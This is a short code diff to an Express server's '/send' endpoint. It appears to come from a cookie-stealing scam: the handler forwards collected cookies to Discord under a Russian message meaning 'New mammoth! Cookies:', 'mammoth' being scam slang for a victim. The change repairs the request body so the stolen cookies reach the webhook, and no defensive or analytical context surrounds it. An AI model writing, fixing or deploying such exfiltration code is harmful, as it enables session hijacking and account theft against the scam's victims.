@@ -35,7 +35,7 @@ app.post('/send', async (req, res) => {
             headers: {
               "Content-Type": "application/json"
             },
-            content: `Новый мамонт! \n Куки: ${fieldsArray.concat("\n \n")}`
+            body: JSON.stringify({ content: `Новый мамонт! \n Куки: ${fieldsArray.concat("\n \n")}` })
         });
         console.log(response);
         // Формируем правильную структуру для Discord
